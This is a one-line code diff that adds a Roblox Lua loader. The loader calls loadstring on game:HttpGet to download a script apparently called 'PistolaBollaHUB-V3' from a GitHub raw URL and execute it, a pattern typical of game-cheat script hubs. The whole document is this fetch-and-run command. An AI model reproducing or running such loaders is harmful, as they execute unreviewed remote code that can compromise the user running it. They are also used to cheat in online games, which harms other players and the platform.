@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BABAJI69BRUH/grippos/main/PistolaBollaHUB-V3.txt"))();
